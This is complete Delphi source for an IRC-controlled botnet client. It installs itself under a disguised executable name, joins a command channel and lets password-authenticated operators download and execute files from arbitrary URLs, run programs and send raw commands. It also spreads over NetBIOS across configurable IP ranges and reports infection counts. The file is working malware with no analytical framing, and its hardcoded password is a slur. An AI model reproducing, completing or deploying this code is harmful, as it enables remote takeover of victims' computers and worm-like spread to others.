   program enB;

   uses
     Windows,
     Winsock,
     Messages,
     uNetBios,
     uFunctions in 'uFunctions.pas';

   type
     TBotData = Record
       server      :String;
       port        :Integer;
       nick        :String;
       ident       :String;
       mail        :String;
     end;
     PBotData = ^TBotData;

   const
     CMD_RAW       :String = '!.raw';
     CMD_RUN       :String = '!.run';
     CMD_LOGIN     :String = '!.login';
     CMD_LOGOUT    :String = '!.logout';
     CMD_OPEN      :String = '!.open';
     CMD_NBSTOP    :String = '!.nbstop';
     CMD_NBSTART   :String = '!.nbstart';
     CMD_NBINFO    :String = '!.nbinfo';
     CMD_SETIP     :String = '!.setip';
     CMD_DIE       :String = '!.alldie';
     CMD_REPORT    :String = '!.setreport';

   Var
     Sec, Min,
     Hour, Day     : Integer;
     Uptime        : String;
     BotData       : TBotData;
     AllStop       : Boolean;
     Params        : Array[0..10] Of String;
     Admins        : Array[0..600] Of String;
     aNr           : Integer;
     D             : DWord;

   Function IsAdmin(Nick: String): Boolean;
   Var
     i: Integer;
   Begin
     Result := False;
     For I := 0 To 600 Do
       If Admins[i] = Nick Then Result := True;
   End;

   Procedure RedoAdmins(Nick: String);
   Var
     tmpAdmins     : Array[0..600] Of String;
     tmpaNr        : Integer;
     I             : Integer;
   Begin
     FillChar(tmpAdmins, 600, 0);
     tmpaNr := 0;

     For I := 0 To 600 Do
     Begin
       If (Admins[i] <> Nick) and (Admins[i] <> '') Then
       Begin
         tmpAdmins[i] := Admins[i];
         Inc(tmpaNr,1);
       End;
     End;

     Move(Admins, tmpAdmins, 600);
   End;

   Function SendText(Text: String; Sock: TSocket):DWord;
   Begin
     Result :=
               Send(Sock, Text[1], Length(Text), 0);
   End;

   Procedure Read(Sock: TSocket);
   Label
     Abort;
   Var
     Buff          :Array[0..16000] Of Char;
     Data          :String;

     Nick          :String;
     Msg           :String;
     Ident         :String;
     Host          :String;
     FullHost      :String;
     Channel       :String;

     Tmp           :String;
     Tmp2          :String;

     I             :Integer;

     Procedure GetParams(S: String);
     Var
       Tmp         :String;
       I           :Integer;
     Begin
       S := S + ' ';
       I := 0;

       While Pos(' ', S) > 0 Do
       Begin
         If I = 10 Then Break;
         Tmp := Copy(S, 1, Pos(' ', S)-1);
         S   := Copy(S, Pos(' ', S)+1, Length(S));
         If Tmp <> '' Then
         Begin
           Params[i] := Tmp;
           Inc(I);
         End;
       End;
     End;

   Begin
     While Recv(Sock, Buff, SizeOf(Buff), 0) > 0 Do
     Begin

       Data := '';
       Data := Buff;
       ZeroMemory(@Buff, SizeOf(Buff));

       Nick        := iGetNick(Data);
       Msg         := iGetMessage(Data);
       Ident       := iGetIdent(Data);
       Host        := iGetHost(Data);
       FullHost    := iGetFullHost(Data);
       Channel     := iGetChannel(Data);

       ZeroMemory(@Params, SizeOf(Params));

       If Pos('PRIVMSG', Data) > 0 Then
         GetParams(Msg);

       If Pos('PING :', Data) > 0 Then
       Begin
         Tmp := Copy(Data, Pos('PING :', Data), Length(Data));
         Tmp := Copy(Tmp, 1, Pos(#13#10, Tmp)+1);

         Delete(Tmp, 2, 1);
         Insert('O', Tmp, 2);

         SendText(Tmp, Sock);
       End Else

       If Pos('MOTD', Data) > 0 Then
       Begin
         Tmp := 'JOIN #wizzz'#13#10;
         SendText(Tmp, Sock);
       End Else

       If LowerCase(Params[0]) = CMD_RAW Then                                      // Rawsocket sending
       Begin
         If Not IsAdmin(Nick) Then Goto Abort;
         Tmp := Copy(Msg, Length(CMD_RAW)+2, Length(Msg));
         SendText(Tmp+#13#10, Sock);
       End Else

       If LowerCase(Params[0]) = CMD_RUN Then                                      // Download and run a file from given url
       Begin
         If Not IsAdmin(Nick) Then Goto Abort;
         If Params[1] = '' Then Goto Abort;
         If Params[2] = '' Then Goto Abort;
         If Params[3] = '' Then Goto Abort;

         SendText('PRIVMSG #wizzz :Downloading ('+Params[1]+')'#13#10, Sock);

         URLDownloadToFile(0, pCHar(Params[1]), pCHar(Params[2]), 0, 0);

         SendText('PRIVMSG #wizzz :Downloaded ('+Params[1]+') as ('+Params[2]+')'#13#10, Sock);

         If Params[3] = '1' Then
         Begin
           If Params[4] = '' Then Params[4] := '1';
           ExecuteFile(Params[2], Boolean(StrToInt(Params[4])));
           SendText('PRIVMSG #wizzz :Executed ('+Params[2]+')'#13#10, Sock);
         End;
       End Else

       If LowerCase(Params[0]) = CMD_LOGIN Then                                    // Login as a admin
       Begin
         If Params[1] = '' Then Goto Abort;
         For I := 0 To 600 Do
           If Admins[i] = Nick Then Goto Abort;

         // Password : iamahomo
         Tmp2 := 'iamahomo';

         If Params[1] = Tmp2 Then
         Begin
           Admins[aNr] := Nick;
           Inc(aNr,1);
           SendText('PRIVMSG #wizzz :Welcome Master'#13#10, Sock);
         End;
       End Else

       If LowerCase(Params[0]) = CMD_LOGOUT Then                                   // Logout from adminlist
       Begin
         If Not IsAdmin(Nick) Then Goto Abort;
         RedoAdmins(Nick);
         SendText('PRIVMSG #wizzz :Bye bye '+Nick+#13#10, Sock);
       End Else

       If LowerCase(Params[0]) = CMD_OPEN Then                                     // Open a url/file
       Begin
         If Not IsAdmin(Nick) Then Goto Abort;
         If Params[1] = '' Then Goto Abort;
         If Params[2] = '' Then Params[2] := '1';
         ExecuteFile(Params[1], Boolean(StrToInt(Params[2])));
         SendText('PRIVMSG #wizzz :Executed ('+Params[1]+')'#13#10, Sock);
       End Else

       If LowerCase(Params[0]) = CMD_NBSTOP Then                                   // NetBIOS Stop
       Begin
         If Not IsAdmin(Nick) Then Goto Abort;
         NetBios := 'STOP';
         SendText('PRIVMSG #wizzz :Netbios stopped'#13#10, Sock);
       End Else

       If LowerCase(Params[0]) = CMD_NBSTART Then                                  // NetBIOS Start
       Begin
         If Not IsAdmin(Nick) Then Goto Abort;
         NetBios := 'START';
         SendText('PRIVMSG #wizzz :Netbios started'#13#10, Sock);
       End Else

       If LowerCase(Params[0]) = CMD_NBINFO Then                                   // NetBIOS Info
       Begin
         If Not IsAdmin(Nick) Then Goto Abort;
         SendText('PRIVMSG #wizzz :NetBios Infections ('+FixInfected+') Uptime ('+Uptime+') using 200 threads.'#13#10, Sock);
       End Else

       If LowerCase(Params[0]) = CMD_SETIP Then                                    // Set NetBIOS Scan IP Range
       Begin
         If Not IsAdmin(Nick) Then Goto Abort;
         If Params[1] = '' Then Goto Abort;
         nbIP := Params[1];
         SendText('PRIVMSG #wizzz :nbIP = '+nbIP+#13#10, Sock);
       End;

       If LowerCase(Params[0]) = CMD_REPORT Then                                    // Set NetBIOS Report level
       Begin
         If Not IsAdmin(Nick) Then Goto Abort;
         If Params[1] = '' Then Goto Abort;
         Report := StrToInt(Params[1]);
         SendText('PRIVMSG #wizzz :Report Level = '+IntToStr(Report)+#13#10, Sock);
       End;

       If LowerCase(Params[0]) = CMD_DIE Then                                      // Die
       Begin
         If Not IsAdmin(Nick) Then Goto Abort;
         SendText('QUIT :Admin Request'#13#10, Sock);
         Sleep(800);
         AllStop := True;
         CloseSocket(Sock);
         Exit;
       End;
   Abort:
     End;
   End;

   Function CreateBot(P: Pointer) : Dword; stdcall;
   Var
     IrcSock       :TSocket;
     IrcA          :TSockAddrIn;
     Wsa           :TWsaData;

     Nick          :String;
     Server        :String;
     Ident         :String;
     Mail          :String;
     Data          :String;

     Port          :Integer;
   Begin

     Nick          := PBotData(P)^.nick;
     Server        := PBotData(P)^.server;
     Ident         := PBotData(P)^.ident;
     Mail          := PBotData(P)^.mail;
     Port          := PBotData(P)^.port;

     Repeat
       ZeroMemory(@Admins, SizeOf(Admins));
       aNr := 0;

       WSAStartUp(257, Wsa);

       IrcSock := Socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
       IrcA.sin_family := AF_INET;
       IrcA.sin_port := hTons(Port);
       IrcA.sin_addr.S_addr := inet_addr(pChar(Server));
       If Connect(IrcSock, IrcA, SizeOf(IrcA)) = ERROR_SUCCESS Then
       Begin
         nbSock := IrcSock;
         Data := 'USER '+Ident+' '+Ident+Mail+' '+Ident+' '+Ident+#13#10;
         SendText(Data, IrcSock);

         Data := 'NICK '+Nick+#13#10;
         SendText(Data, IrcSock);

         Read(IrcSock);
       End;
       CloseSocket(IrcSock);

     Until ( 1 = 2 ) Or ( AllStop );
   End;

   Procedure Upt;
   Var
     Tmp: String;
   Begin
     Repeat
       Inc(Sec, 1);

       If Sec = 60 Then
       Begin
         Inc(Min, 1);
         Sec := 0;
       End;

       If Min = 60 Then
       Begin
         Inc(Hour, 1);
         Min := 0;
       End;

       If Hour = 24 Then
       Begin
         Inc(Day, 1);
         Hour := 0;
       End;

       Tmp := IntToStr(Sec);
       While Length(Tmp) < 2 Do
         Tmp := '0' + Tmp;

       Uptime := Tmp + '.';


       Tmp := IntToStr(Min);
       While Length(Tmp) < 2 Do
         Tmp := '0' + Tmp;

       Uptime := Uptime + Tmp + '.';


       Tmp := IntToStr(Hour);
       While Length(Tmp) < 2 Do
         Tmp := '0' + Tmp;

       Uptime := Uptime + Tmp + '.';


       Tmp := IntToStr(Day);
       While Length(Tmp) < 3 Do
         Tmp := '0' + Tmp;

       Uptime := Uptime + Tmp;


       Sleep(1000);

     Until 1 = 2;
   End;

   Function RandomNickName:String;
   Var
     I: Integer;
   Begin
     // 97 -> 122
     Randomize;
     Result := '[B]';
     For I:=0 To 20 Do
       Result := Result + Chr( Random(26)+97 );
   End;

   begin

     Sec := 0; Min := 0; Hour := 0; Day := 0;
     Report := 2;
     AllStop := False;
     nbIP := '22x.x.x.x';

     InstallMe('YAnbW.exe');

     BotData.server := IpStr('xxxx-removed-xxxx');
     BotData.port := 6667;
     BotData.nick := RandomNickName;
     BotData.ident := RandomNickName;
     BotData.mail := '@'+RandomNickName+'.com';

     CreateThread(NIL, 0, @CreateBot, Pointer(@BotData), 0, D);
     CreateThread(NIL, 0, @Upt, NIL, 0, D);

     StartNetBios(253);

     Repeat
       ;
     Until AllStop;

   end.
